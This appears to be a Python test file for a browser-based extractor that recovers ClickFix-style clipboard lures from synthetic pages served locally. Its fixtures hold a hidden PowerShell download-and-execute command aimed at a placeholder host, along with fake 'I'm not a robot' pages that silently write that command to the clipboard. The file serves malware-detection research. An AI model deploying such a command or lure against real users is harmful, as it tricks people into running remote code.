"""Browser-backed extractor tests (Playwright/Chromium), synthetic fixtures only.

Skipped automatically when Playwright is unavailable (e.g. system python), so
the main suite stays green; run under the eval_staging venv to execute them.
No live sites: everything is served from a local HTTP fixture server.
"""
import os
import sys
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

from browser_extractor import HAVE_PLAYWRIGHT, browser_extract, browser_recover, parse_proxy  # noqa: E402
from validate import validate_payload  # noqa: E402
from classify import classify_payload  # noqa: E402
from sanitize import evaluate as sanitize_eval  # noqa: E402
from config import SanitizeConfig  # noqa: E402

PS = 'powershell -w hidden -nop -c "iex(irm http://example.invalid/a.ps1)"'


class ProxyParseTest(unittest.TestCase):
    """parse_proxy is pure -- runs without Playwright, so it stays in the main suite."""
    def test_none_and_dict(self):
        self.assertIsNone(parse_proxy(None))
        self.assertIsNone(parse_proxy(""))
        self.assertEqual(parse_proxy({"server": "http://x:1"}), {"server": "http://x:1"})

    def test_full_url_with_creds(self):
        self.assertEqual(parse_proxy("http://user:pass@1.2.3.4:8080"),
                         {"server": "http://1.2.3.4:8080", "username": "user", "password": "pass"})

    def test_creds_no_scheme(self):
        self.assertEqual(parse_proxy("user:pass@host:3128"),
                         {"server": "http://host:3128", "username": "user", "password": "pass"})

    def test_bare_host_port(self):
        self.assertEqual(parse_proxy("10.0.0.1:1080"), {"server": "http://10.0.0.1:1080"})

# Each fixture page. Clickable elements use the ClickFix-style class so the
# extractor's DEFAULT_INTERACTIONS matches them.
FIXTURES = {
    # 1. direct write at load
    "/direct": ("text/html",
        "<!doctype html><script>navigator.clipboard.writeText(%r)</script>" % PS),
    # 2. click-triggered write
    "/click": ("text/html",
        '<!doctype html><button class="x im-not-a-robot">I\'m not a robot</button>'
        '<script>document.querySelector(".im-not-a-robot").addEventListener("click",'
        'function(){navigator.clipboard.writeText(%r)})</script>' % PS),
    # 3. textarea + execCommand(copy) fallback on click
    "/execcmd": ("text/html",
        '<!doctype html><textarea id="t">%s</textarea>'
        '<button class="verifywin-verify-button">Verify</button>'
        '<script>document.querySelector(".verifywin-verify-button").addEventListener("click",'
        'function(){var t=document.getElementById("t");t.focus();t.select();'
        'document.execCommand("copy")})</script>' % PS),
    # 4. delayed write (1500ms after load, no interaction)
    "/delayed": ("text/html",
        "<!doctype html><script>setTimeout(function(){navigator.clipboard.writeText(%r)},1500)</script>" % PS),
    # 5. command fetched from a secondary endpoint, then written on click
    "/secondary": ("text/html",
        '<!doctype html><button class="im-not-a-robot">verify</button>'
        '<script>document.querySelector(".im-not-a-robot").addEventListener("click",'
        'function(){fetch("/cmd").then(r=>r.text()).then(t=>navigator.clipboard.writeText(t))})</script>'),
    "/cmd": ("text/plain", PS),
    # 6. invalid clipboard content (not a command)
    "/invalid": ("text/html",
        "<!doctype html><script>navigator.clipboard.writeText('please verify you are human')</script>"),
    # 7. page that never writes (timeout / no clipboard)
    "/nowrite": ("text/html", "<!doctype html><h1>Verify you are human</h1>"),
    # 8. navigation: write at load, then navigate away shortly after
    "/navigate": ("text/html",
        "<!doctype html><script>navigator.clipboard.writeText(%r);"
        "setTimeout(function(){location.replace('/nowrite')},1000)</script>" % PS),
}


class _H(BaseHTTPRequestHandler):
    def do_GET(self):
        route = FIXTURES.get(self.path.split("?")[0])
        if route is None:
            self.send_error(404); return
        ctype, body = route
        data = body.encode()
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers(); self.wfile.write(data)
    def log_message(self, *a): pass


@unittest.skipUnless(HAVE_PLAYWRIGHT, "playwright not available (run under eval_staging venv)")
class TestBrowserExtractor(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.srv = HTTPServer(("127.0.0.1", 0), _H)
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()
        cls.base = "http://127.0.0.1:%d" % cls.srv.server_port

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown(); cls.srv.server_close()

    def x(self, path, **kw):
        return browser_extract(self.base + path, **kw)

    def test_1_direct_write(self):
        r = self.x("/direct")
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.method, "writeText")
        self.assertFalse(r.via_interaction)

    def test_2_click_triggered(self):
        r = self.x("/click")
        self.assertEqual(r.command_text, PS)
        self.assertTrue(r.via_interaction)
        self.assertTrue(any("robot" in s for s in r.clicked_selectors))

    def test_3_execcommand_fallback(self):
        r = self.x("/execcmd")
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.method, "execCommand")

    def test_4_delayed_write(self):
        r = self.x("/delayed", final_settle_ms=2500)
        self.assertEqual(r.command_text, PS)

    def test_5_secondary_api(self):
        r = self.x("/secondary")
        self.assertEqual(r.command_text, PS)
        # corroborated by network capture too
        self.assertTrue(r.command_text == PS)

    def test_6_invalid_content_captured_but_rejected(self):
        r = self.x("/invalid")
        self.assertIsNotNone(r.command_text)           # captured as DATA
        v = validate_payload(r.command_text)
        self.assertFalse(v.valid)                        # but not a valid command
        self.assertEqual(classify_payload(r.command_text).payload_type, "unknown")

    def test_7_timeout_no_write(self):
        r = self.x("/nowrite", final_settle_ms=800)
        self.assertIsNone(r.command_text)
        self.assertEqual(r.failure_reason, "no_clipboard_text")

    def test_8_navigation_still_recovers_preclick(self):
        # command written at load is retained from pre-nav capture
        r = self.x("/navigate")
        self.assertEqual(r.command_text, PS)

    def test_9_nav_error_is_graceful(self):
        r = browser_extract("http://127.0.0.1:1/nope", nav_timeout_ms=3000)
        self.assertIsNone(r.command_text)
        self.assertTrue(r.failure_reason.startswith(("nav_error", "nav_timeout")))

    def test_10_provenance_integration(self):
        out = browser_recover(self.base + "/click", validate_payload, classify_payload,
                              lambda t: sanitize_eval(t, SanitizeConfig()))
        self.assertEqual(out["extraction_layer"], "browser_playwright")
        self.assertEqual(len(out["command_sha256"]), 64)
        self.assertEqual(out["validation_status"], "valid")
        self.assertIn(out["cape_package"], ("ps1", "batch"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
